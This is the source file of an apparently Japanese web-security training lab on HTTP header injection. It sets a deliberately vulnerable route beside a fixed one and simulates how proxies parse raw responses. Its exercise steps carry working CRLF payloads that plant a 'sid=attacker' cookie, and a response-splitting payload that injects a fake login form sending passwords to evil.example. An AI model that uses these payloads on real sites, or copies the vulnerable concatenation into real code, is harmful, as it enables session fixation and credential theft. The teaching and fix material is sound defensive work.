import { Hono } from "hono";
import type { Context } from "hono";
import type { AppEnv } from "../env";
import { escapeHtml, exercisePage, md, table } from "../lab/html";
import {
  buildRawResponse,
  hasControlChars,
  headerLine,
  parseRawResponse,
  parseSetCookie,
  visualizeCrlfHtml,
  type Header,
} from "../lab/rawhttp";
import type { Exercise } from "../lab/types";

/**
 * HTTPヘッダインジェクション。
 *
 * 現代の Fetch API（Headers / Response）は、ヘッダー値に CR/LF があると TypeError を投げるので、Workers の普通のコードでは
 * この脆弱性は起きない。そこで「ヘッダー行を文字列連結で作り、CRLF でつないで生のバイト列にする古い/独自実装」を
 * 純粋な文字列操作（src/lab/rawhttp.ts）で再現する。実際の HTTP レスポンスはここでは作らず、組み立てた文字列を
 * 画面に見せ、プロキシ/ブラウザがそれをどう解釈するかを解析して見せる。
 */

const ID = "header-injection";
type Mode = "vuln" | "fixed";
type Kind = "lang" | "go";

const LANG_BODY = "<p>言語設定を保存しました。</p>";

const NOTICE = `<div class="notice"><strong>擬似環境です。</strong> 本物のレスポンスヘッダーに改行を入れようとすると Workers のランタイムが拒否します。そこでこの演習では、ヘッダー行を<strong>文字列連結で組み立てた「生のレスポンス」</strong>を画面に表示し、それを受け取ったプロキシやブラウザが<strong>どう解釈するか</strong>を解析して見せます。実際に送信されるレスポンスはありません。</div>`;

/** 想定どおりのヘッダーか（注入されたものに印を付けるための表示用。防御ではない） */
function judge(kind: Kind, headers: Header[]): boolean[] {
  let cookies = 0;
  let locations = 0;
  return headers.map((h) => {
    const n = h.name.toLowerCase();
    if (n === "cache-control") return true;
    if (kind === "lang") return n === "content-type" || (n === "set-cookie" && parseSetCookie(h.value)?.name === "lang" && ++cookies === 1);
    return n === "location" && ++locations === 1;
  });
}

/** 組み立てた生のレスポンスを解析して見せ、Set-Cookie を模擬ブラウザの Cookie に保存する */
async function showResponse(c: Context<AppEnv>, mode: Mode, kind: Kind, raw: string, note = "") {
  const p = parseRawResponse(raw);
  const expectedBody = kind === "lang" ? LANG_BODY : "";

  // 模擬ブラウザ: 成功・リダイレクトの応答に含まれる Set-Cookie をすべて保存する
  if (p.status !== null && p.status < 400) {
    for (const h of p.headers) {
      if (h.name.toLowerCase() !== "set-cookie") continue;
      const ck = parseSetCookie(h.value);
      if (!ck) continue;
      await c.var.db.run(
        `INSERT INTO header_injection_jar (mode, name, value) VALUES (?, ?, ?)
         ON CONFLICT(mode, name) DO UPDATE SET value = excluded.value`,
        [mode, ck.name.slice(0, 100), ck.value.slice(0, 300)],
      );
    }
  }

  const ok = judge(kind, p.headers);
  const headerRows = p.headers.map((h, i) => [i + 1, h.name, h.value, ok[i] ? "想定どおり" : "⚠ 想定外（注入された）"]);
  const bodyChanged = p.body !== expectedBody;
  const loc = p.headers.find((h) => h.name.toLowerCase() === "location");

  const preview =
    bodyChanged && p.body.trim()
      ? `<p>ブラウザがこの本文を HTML として表示すると、次のような画面になります（安全のため、スクリプトとフォーム送信を無効にした枠の中に表示しています）。</p>
<iframe sandbox title="偽の本文のプレビュー" srcdoc="${escapeHtml(p.body)}" style="width:100%;height:170px;border:1px solid var(--line);background:#fff"></iframe>`
      : "";

  const body = `<h1>${kind === "lang" ? "言語設定" : "ログイン後のリダイレクト"}（模擬）</h1>
${NOTICE}
${note ? `<p>${escapeHtml(note)}</p>` : ""}
<h2>① サーバーが組み立てた生のレスポンス</h2>
<p><mark>␍␊</mark> は CR LF（行の終わり）、<mark>␊</mark> は LF だけの改行です。入力に含まれた改行も、サーバー自身が入れた改行と区別なく並びます。</p>
<pre class="code"><code>${visualizeCrlfHtml(raw)}</code></pre>
<h2>② プロキシ・ブラウザの解釈</h2>
<p>ステータス行: <code>${escapeHtml(p.statusLine)}</code></p>
${p.headers.length ? table(["#", "ヘッダー名", "値", "判定"], headerRows) : "<p>ヘッダーはありません。</p>"}
${p.malformed.length ? `<p>名前: 値の形になっていない行（無視されます）: ${p.malformed.map((m) => `<code>${escapeHtml(m)}</code>`).join(" ")}</p>` : ""}
${loc ? `<p>ブラウザの動き: <code>Location</code> に従って <code>${escapeHtml(loc.value)}</code> へ移動します。</p>` : ""}
<h3>本文</h3>
${bodyChanged ? `<div class="notice notice--warn"><strong>⚠ 本文が本来のものと違います。</strong> 入力の改行でヘッダーが終わり、攻撃者の文字列が本文として扱われています。</div>` : `<p class="ok">本文は想定どおりです。</p>`}
<pre class="code"><code>${escapeHtml(p.body) || " "}</code></pre>
${preview}
${await jarHtml(c, mode)}
<p><a href="/x/${ID}/${mode}/">← 入力へ戻る</a></p>`;
  return c.html(exercisePage({ id: ID, mode, title: "HTTPヘッダインジェクション", body }));
}

/** 模擬ブラウザの Cookie 一覧 */
async function jarHtml(c: Context<AppEnv>, mode: Mode): Promise<string> {
  const jar = await c.var.db.all<{ name: string; value: string }>(
    "SELECT name, value FROM header_injection_jar WHERE mode = ? ORDER BY name",
    [mode],
  );
  const fixation =
    jar.some((j) => j.name === "sid") && mode === "vuln"
      ? `<div class="notice notice--warn"><strong>⚠ <code>sid</code> という Cookie が保存されました。</strong> アプリが発行した覚えのないセッション ID を、攻撃者が被害者のブラウザに持たせられたことになります（セッション固定化。<a href="/x/session-fixation">セッション固定化の演習</a>へ）。</div>`
      : "";
  return `<h2>模擬ブラウザが保存した Cookie</h2>
${jar.length ? table(["名前", "値"], jar.map((j) => [j.name, j.value])) : "<p>まだありません。</p>"}
${fixation}
<form method="post" action="/x/${ID}/${mode}/jar-clear"><button class="ghost">Cookie を消す</button></form>`;
}

/** 入力画面 */
async function indexPage(c: Context<AppEnv>, mode: Mode) {
  const hint =
    mode === "vuln"
      ? `<p>※ 入力欄に <code>%0d%0a</code> と書いても、ブラウザが <code>%</code> を <code>%25</code> に直して送るので改行にはなりません。攻撃者は画面を使わず、<strong>URL を直接書き換えて</strong>リクエストを送ります。解説ページの手順のリンクや、アドレスバーを使ってください。</p>`
      : "";
  const body = `<h1>言語設定とリダイレクト</h1>
${NOTICE}
<h2>① 表示言語を切り替える</h2>
<p>選んだ言語を Cookie（<code>lang</code>）に保存します。</p>
<p><a href="/x/${ID}/${mode}/lang?lang=ja">日本語にする</a> / <a href="/x/${ID}/${mode}/lang?lang=en">英語にする</a></p>
<form method="get" action="/x/${ID}/${mode}/lang"><label>lang <input name="lang" value="ja" size="30"></label> <button>設定する</button></form>
<h2>② ログイン後の移動先</h2>
<p>ログインが済んだら <code>url</code> で指定されたページへ移動させます。</p>
<form method="get" action="/x/${ID}/${mode}/go"><label>url <input name="url" value="/mypage" size="40"></label> <button>移動する</button></form>
${hint}
<h2>③ 実際の Workers ではどうなる？</h2>
<form method="get" action="/x/${ID}/${mode}/runtime"><button>本物の Headers に改行を入れて試す</button></form>
${await jarHtml(c, mode)}`;
  return c.html(exercisePage({ id: ID, mode, title: "言語設定とリダイレクト", body }));
}

/** 400: ヘッダーに使えない値を拒否した */
function rejectPage(c: Context<AppEnv>, mode: Mode, field: string, value: string, reason: string) {
  const body = `<h1>400 Bad Request</h1>
${NOTICE}
<div class="notice notice--warn"><strong>リクエストを拒否しました。</strong> ${escapeHtml(reason)}</div>
<p>拒否した <code>${escapeHtml(field)}</code> の値（改行は記号で表示）:</p>
<pre class="code"><code>${visualizeCrlfHtml(value.slice(0, 300)) || " "}</code></pre>
<p>生のレスポンスは組み立てていません。ヘッダーにも、Cookie にも、何も追加されていません。</p>
<p><a href="/x/${ID}/${mode}/">← 入力へ戻る</a></p>`;
  return c.html(exercisePage({ id: ID, mode, title: "400 Bad Request", body }), 400);
}

/** 実際の Fetch API（Headers / Response）に改行を入れるとどうなるか。外部通信はしない */
function runtimePage(c: Context<AppEnv>, mode: Mode) {
  const probes: [string, () => unknown][] = [
    ['new Headers().set("X-Test", "a\\r\\nb")', () => new Headers().set("X-Test", "a\r\nb")],
    ['new Headers().set("X-Test", "a\\nb")  // LF だけ', () => new Headers().set("X-Test", "a\nb")],
    [
      'new Headers().append("Set-Cookie", "lang=ja\\r\\nSet-Cookie: sid=attacker")',
      () => new Headers().append("Set-Cookie", "lang=ja\r\nSet-Cookie: sid=attacker"),
    ],
    [
      'new Response(null, { headers: { Location: "/a\\r\\nSet-Cookie: sid=attacker" } })',
      () => new Response(null, { headers: { Location: "/a\r\nSet-Cookie: sid=attacker" } }),
    ],
    [
      'Response.redirect("https://example.com/a\\r\\nSet-Cookie: sid=attacker", 302).headers.get("location")',
      () => Response.redirect("https://example.com/a\r\nSet-Cookie: sid=attacker", 302).headers.get("location"),
    ],
  ];
  const rows = probes.map(([expr, run]) => {
    try {
      const r = run();
      return [expr, `例外なし。戻り値: ${JSON.stringify(r ?? null)}`];
    } catch (e) {
      const err = e as Error;
      return [expr, `${err.name}: ${err.message}`];
    }
  });
  const body = `<h1>実際の Workers ではどうなる？</h1>
<div class="notice"><strong>これは擬似ではなく、このサーバーで実際に動いているコードの結果です。</strong> 外部への通信はしていません。</div>
${table(["実行した式", "結果"], rows)}
${md(`
現代のランタイムの Fetch API は、ヘッダーの値に CR や LF が含まれていると **TypeError で拒否**します。Workers の普通のコードでヘッダーを設定する限り、この脆弱性は起きません。

最後の \`Response.redirect\` は例外にならず、URL の解析で改行が**取り除かれ**て、別の URL になります（ヘッダーは増えませんが、リダイレクト先が意図とずれます）。

一方で、次のような場面では、いまも同じ問題が起きます。
- 古いフレームワークや、独自にヘッダー行を文字列連結で組み立てる実装
- 別のプロトコルの出力（メールのヘッダー、ログの 1 行、SMTP/IMAP のコマンドなど）
- リバースプロキシや CGI など、ヘッダーを文字列として受け渡す中間層
`)}
<p><a href="/x/${ID}/${mode}/">← 入力へ戻る</a></p>`;
  return c.html(exercisePage({ id: ID, mode, title: "実際の Workers ではどうなる？", body }));
}

/** 両モード共通の補助ルート（Cookie を消す、本物の Headers で試す） */
function mountCommon(app: Hono<AppEnv>, mode: Mode) {
  app.get("/runtime", (c) => runtimePage(c, mode));
  app.post("/jar-clear", async (c) => {
    await c.var.db.run("DELETE FROM header_injection_jar WHERE mode = ?", [mode]);
    return c.redirect(`/x/${ID}/${mode}/`, 303);
  });
}

//#region vuln
const vuln = new Hono<AppEnv>();

vuln.get("/", (c) => indexPage(c, "vuln"));

vuln.get("/lang", (c) => {
  const lang = c.req.query("lang") ?? "ja";
  const cookie = "Set-Cookie: lang=" + lang + "; Path=/"; // [!] 入力をそのままヘッダー行に連結している（CR/LF を検査しない）
  const raw = buildRawResponse(200, ["Content-Type: text/html; charset=UTF-8", cookie, "Cache-Control: no-store"], LANG_BODY);
  return showResponse(c, "vuln", "lang", raw);
});

vuln.get("/go", (c) => {
  const url = c.req.query("url") ?? "/mypage";
  const location = "Location: " + url; // [!] リダイレクト先もそのまま連結している
  const raw = buildRawResponse(302, [location, "Cache-Control: no-store"]);
  return showResponse(c, "vuln", "go", raw);
});

mountCommon(vuln, "vuln");
//#endregion

//#region fixed
const fixed = new Hono<AppEnv>();

fixed.get("/", (c) => indexPage(c, "fixed"));

// Cookie に入れてよい言語は 2 つだけ。入力そのものはヘッダーに入れない
const LANGS = ["ja", "en"];

// リダイレクト先は、サイト内のパスか、許可したホストだけ
const ALLOWED_HOSTS = new Set(["example.com", "www.example.com"]);

function safeTarget(url: string): string | null {
  if (/^\/(?![/\\])/.test(url)) return url;
  try {
    const u = new URL(url);
    if ((u.protocol === "https:" || u.protocol === "http:") && ALLOWED_HOSTS.has(u.hostname)) return u.toString();
  } catch {
    // URL として解釈できない
  }
  return null;
}

fixed.get("/lang", (c) => {
  const input = c.req.query("lang") ?? "ja";
  if (hasControlChars(input)) return rejectPage(c, "fixed", "lang", input, "ヘッダーに使えない文字（改行などの制御文字）が含まれています。");
  const lang = LANGS.includes(input) ? input : "ja"; // 許可リストから選ぶ
  // headerLine は値に制御文字があると例外にする（Headers.set と同じ検査）。手でヘッダー行を連結しない
  const raw = buildRawResponse(
    200,
    [
      headerLine("Content-Type", "text/html; charset=UTF-8"),
      headerLine("Set-Cookie", `lang=${lang}; Path=/; HttpOnly; SameSite=Lax`),
      headerLine("Cache-Control", "no-store"),
    ],
    LANG_BODY,
  );
  const note = lang === input ? "" : `「${input}」は許可した言語ではないため、${lang} にしました。`;
  return showResponse(c, "fixed", "lang", raw, note);
});

fixed.get("/go", (c) => {
  const url = c.req.query("url") ?? "/mypage";
  if (hasControlChars(url)) return rejectPage(c, "fixed", "url", url, "ヘッダーに使えない文字（改行などの制御文字）が含まれています。");
  const target = safeTarget(url);
  if (target === null) return rejectPage(c, "fixed", "url", url, "リダイレクト先として許可されていない URL です。");
  const raw = buildRawResponse(302, [headerLine("Location", target), headerLine("Cache-Control", "no-store")]);
  return showResponse(c, "fixed", "go", raw);
});

mountCommon(fixed, "fixed");
//#endregion

export const exercise: Exercise = {
  id: ID,
  title: "HTTPヘッダインジェクション",
  summary: "リダイレクト先や Cookie の値に改行を混ぜると、ヘッダーを増やしたり本文を差し替えたりできる。",
  level: 2,
  book: { chapter: 4, topic: "リダイレクト・クッキー出力にまつわる問題" },
  schema: [
    `CREATE TABLE header_injection_jar (
       mode TEXT NOT NULL,
       name TEXT NOT NULL,
       value TEXT NOT NULL,
       PRIMARY KEY (mode, name)
     )`,
  ],
  vuln,
  fixed,
  doc: {
    goals: [
      "HTTP のレスポンスが「ヘッダー行を CRLF で区切り、空行のあとが本文」という文字列であることから、改行の注入で何が起きるかを説明できる",
      "任意のヘッダー追加（Set-Cookie によるセッション固定化）と、空行の注入による本文の差し込み（レスポンス分割）の違いを区別できる",
      "現代のランタイムが防いでいる理由と、それでも同じ問題が起きる場面（独自実装・別プロトコル）を説明できる",
    ],
    background: `
HTTP のレスポンスは、実体としては**ただの文字列**です。1 行目がステータス、続いて \`名前: 値\` のヘッダー行が CRLF（\`\\r\\n\`）で区切られて並び、**空行**が来たらヘッダーが終わり、その後ろが本文になります。

ヘッダーの値に利用者の入力（リダイレクト先の URL、Cookie に入れる言語設定など）を使うとき、もし入力の中に CR/LF が含まれていると、受け取る側（プロキシやブラウザ）は、**入力の途中で行が終わった**と解釈します。つまり攻撃者は次のことができます。

- **ヘッダーの追加**: 改行の後に \`Set-Cookie: sid=...\` のような行を書けば、ヘッダーが 1 本増えます。被害者のブラウザに、攻撃者が用意したセッション ID を持たせる（セッション固定化）ことなどに使われます。
- **本文の差し込み（レスポンス分割）**: 改行を 2 回続けて空行を作れば、そこでヘッダーが終わり、以降の文字列が本文として扱われます。偽のページを表示させたり、途中のキャッシュに偽の内容を覚えさせたりできます。

現在の Fetch API（\`Headers\` や \`Response\`）は、値に CR/LF があると例外で拒否するため、普通の Workers のコードではこの問題は起きません。この演習では、**古い実装や独自実装を模して**、ヘッダー行を文字列連結で組み立てる処理を再現しています。画面には「組み立てた生のレスポンス」と「それをどう解釈したか」を並べて表示します。
`,
    steps: [
      {
        title: "通常の動作を確認する",
        body: "言語を `ja` にして、画面の3つの表示を見比べます。①サーバーが組み立てた生のレスポンス（改行が `␍␊` で見える）、②それを解釈したヘッダーの表、③模擬ブラウザに保存された Cookie（`lang=ja`）です。",
        open: { label: "脆弱版で言語を設定する", href: "vuln/lang?lang=ja" },
      },
      {
        title: "ヘッダーを 1 本増やす（Set-Cookie の注入）",
        body: "`lang` の値の後ろに、改行（`%0d%0a`）と別の `Set-Cookie` 行を足します。生のレスポンスで `lang=ja` の行が 2 行に分かれ、解釈結果の表に「⚠ 想定外（注入された）」の `Set-Cookie` が増えます。模擬ブラウザの Cookie に `sid=attacker` が保存されれば成功です。\n\nこれは被害者のブラウザに**攻撃者が決めたセッション ID**を持たせる攻撃で、**セッション固定化**の入口になります。",
        payloads: [
          {
            label: "URL（アドレスバーに貼る）",
            value: `/x/${ID}/vuln/lang?lang=ja%0d%0aSet-Cookie:%20sid=attacker`,
            note: "入力欄に %0d%0a を書いても改行にならないので、URL を直接書き換える",
          },
        ],
        open: { label: "このペイロードで試す", href: "vuln/lang?lang=" + encodeURIComponent("ja\r\nSet-Cookie: sid=attacker") },
      },
      {
        title: "リダイレクト先 (Location) にも注入する",
        body: "ログイン後の移動先 `url` も、ヘッダー行に連結されています。ここでも同じ手口が使えます。正規の `Location` のほかに、攻撃者の `Set-Cookie` が付きます。「ブラウザの動き」の行で、`Location` が通常どおり動くこともあわせて確かめてください。",
        payloads: [
          {
            label: "URL（アドレスバーに貼る）",
            value: `/x/${ID}/vuln/go?url=/mypage%0d%0aSet-Cookie:%20sid=attacker`,
          },
        ],
        open: { label: "このペイロードで試す", href: "vuln/go?url=" + encodeURIComponent("/mypage\r\nSet-Cookie: sid=attacker") },
      },
      {
        title: "空行を作って本文を差し込む（レスポンス分割）",
        body: "改行を 2 回続けると、空行の位置でヘッダーが終わります。それより後ろに書いた文字列が本文になり、本来のヘッダー（`Cache-Control` など）と本来の本文は、その後ろの「ごみ」になります。偽のログイン画面を差し込み、プレビューの枠で確かめてください。",
        payloads: [
          {
            label: "URL（アドレスバーに貼る）",
            value: `/x/${ID}/vuln/lang?lang=ja%0d%0a%0d%0a<h2>セッションが切れました</h2><form action="https://evil.example/login"><input name=pw placeholder="パスワード"><button>再ログイン</button></form>`,
          },
        ],
        open: {
          label: "このペイロードで試す",
          href:
            "vuln/lang?lang=" +
            encodeURIComponent(
              'ja\r\n\r\n<h2>セッションが切れました</h2><form action="https://evil.example/login"><input name=pw placeholder="パスワード"><button>再ログイン</button></form>',
            ),
        },
      },
      {
        title: "LF だけでも通ることを確かめる",
        body: "ヘッダーの区切りは本来 CRLF ですが、多くの実装は LF だけの改行も行の終わりとして受け入れます。「CRLF（`%0d%0a`）を取り除く」だけの対策では不十分で、`%0a` だけでも攻撃が成立します。",
        payloads: [
          { label: "URL（アドレスバーに貼る）", value: `/x/${ID}/vuln/lang?lang=ja%0aSet-Cookie:%20sid=attacker` },
        ],
        open: { label: "このペイロードで試す", href: "vuln/lang?lang=" + encodeURIComponent("ja\nSet-Cookie: sid=attacker") },
      },
      {
        title: "実際の Workers ではどうなるか確かめる",
        body: "トップ画面の「本物の Headers に改行を入れて試す」を押します。このサーバーの本物の `Headers` や `Response` に改行を入れた結果（TypeError）が表示されます。**現代のランタイムは防ぐ**のに、なぜこの演習では起きるのか、考えてみてください。",
        open: { label: "実際の結果を見る", href: "vuln/runtime" },
      },
    ],
    cause: `
原因は、**ヘッダー行を文字列の連結で作り、入力に含まれる改行を検査していないこと**です。ハイライトした 2 行が問題です。

- 1 行目: \`"Set-Cookie: lang=" + lang\` で、入力がヘッダー行の一部になります。入力に CRLF があれば、そこでヘッダー行が分かれます。
- 2 行目: リダイレクト先も同じです。\`Location\` ヘッダーを作る行に入力を連結しています。

どちらも、入力を「値」のつもりで扱っていますが、ヘッダーという文字列の形式の中では、改行が**値の終わりと次のヘッダーの始まり**を意味します。値の中に、構造を表す文字が混ざっているのに、区別できないのです。
`,
    fix: `
修正の要点は、**ヘッダーを手で連結せず、値の検査をする部品を通す**ことです。

- **ヘッダーを作る部品を使う**: \`headerLine(名前, 値)\` は、値に改行などの制御文字があると例外にします。本物の Fetch API の \`Headers.set()\` が内部でやっている検査と同じ働きです。実務では、フレームワークのヘッダー設定 API（\`c.header()\` や \`Headers\`）をそのまま使えば、同じ保護が自動で効きます。
- **CR/LF を含む入力は拒否する（400）**: 入力の時点でも弾きます。\`%0a\` だけの入力も弾けるよう、CR・LF・その他の制御文字をまとめて対象にします。
- **Cookie に入れる値は許可リストから選ぶ**: \`lang\` は \`ja\` と \`en\` だけです。入力そのものをヘッダーに入れないので、改行以外の問題（属性の追加など）も起きません。
- **リダイレクト先を検証する**: サイト内のパスか、許可したホストの URL だけを通します。

「拒否」と「許可リスト」と「部品に任せる」を重ねています。本命は、**自分でヘッダー行を作らない**ことです。
`,
    verify: [
      "修正版で、手順 2〜5 のペイロードをそのまま試す。400 Bad Request になり、「拒否した値」の欄に改行が `␍␊` で表示される",
      "模擬ブラウザの Cookie に `sid` が増えていないことを確かめる",
      "修正版で `lang=fr` を試す。許可リストにないため `ja` が選ばれ、Cookie は `lang=ja` になる",
      "修正版で `url=https://evil.example/` を試す。許可していないホストなので拒否される。`url=/mypage` は通る",
    ],
    beyond: `
**なぜ現代のランタイムは防げるのか。** Fetch API は、ヘッダー値を設定する時点で CR/LF/NUL を検査して TypeError にします。HTTP/2 や HTTP/3 では、そもそもヘッダーが文字列の連なりではなく構造化されたデータなので、改行の注入は成立しません。

**それでも起きる場面。**
- 古い言語・フレームワークの実装や、独自に HTTP を話す中間層（CGI、リバースプロキシの設定、スクリプトでヘッダーを組み立てるコード）
- HTTP/2 から HTTP/1.1 への変換（ダウングレード）で、構造化されたヘッダーが文字列に戻る場所
- **別のプロトコル**: メールのヘッダー（次の「メールヘッダインジェクション」の演習）、ログの 1 行（偽のログ行を差し込まれる）、SMTP や IMAP のコマンドなど

**CR/LF の別の作られ方。** 文字コードの変換や正規化の過程で、別の文字が CR/LF に化けることがあります。一部の実装では、2 バイトの文字が下位 1 バイトに切り詰められ、CR/LF になった事例が知られています。入力ではなく、**ヘッダーを書き出す直前の値**を検査するのが確実です。

**キャッシュ汚染。** レスポンス分割で作った偽のレスポンスが、共有キャッシュ（プロキシや CDN）に保存されると、他の利用者にも配られます。被害は1人では済みません。

**Cookie の値の検証は別の話。** 改行を防いでも、\`;\` を使った属性の追加（\`lang=ja; Domain=...\`）など、Cookie の文法に関する注入は残ります。許可リストで値を選ぶのは、そのためにも有効です。

**セッション固定化への発展。** 注入で任意の \`Set-Cookie\` が付けられれば、セッション固定化の前提が整います。ログイン時のセッション ID の再発行が、最後の防波堤です。
`,
    quiz: [
      {
        q: "Workers の `Headers` は改行を拒否するのに、この演習の脆弱版でヘッダーが増えるのはなぜ？",
        a: "脆弱版は `Headers` を使わず、`\"Set-Cookie: lang=\" + lang` のように文字列を連結して生のバイト列を組み立てているからです。Fetch API は値を設定するときに CR/LF を検査して拒否しますが、文字列の連結にはその検査がありません。古い実装や独自実装、別のプロトコルの出力では、今も同じことが起きます。",
      },
      {
        q: "`lang=ja%0d%0a%0d%0a<h2>…` のように改行を 2 回続けると、何が起きる？",
        a: "空行が作られ、その位置でヘッダーが終わります。それ以降の文字列が本文として扱われるので、攻撃者が用意した偽のページ（偽のログイン画面など）を表示させたり、キャッシュに覚えさせたりできます（レスポンス分割）。本来のヘッダーや本文は、その後ろに回ります。",
      },
      {
        q: "`%0d%0a` だけを取り除く対策では足りないのはなぜ？ 修正版はどう違う？",
        a: "LF だけの改行（`%0a`）も、多くの実装が行の終わりとして受け入れるからです。また、取り除いた結果に改行が再び現れる入力や、文字コード変換で生まれる改行もあります。修正版は、CR・LF を含む制御文字をまとめて拒否し、Cookie の値は許可リスト、ヘッダーは検査つきの部品で作るので、入力の書き方を工夫する余地がありません。",
      },
    ],
  },
};
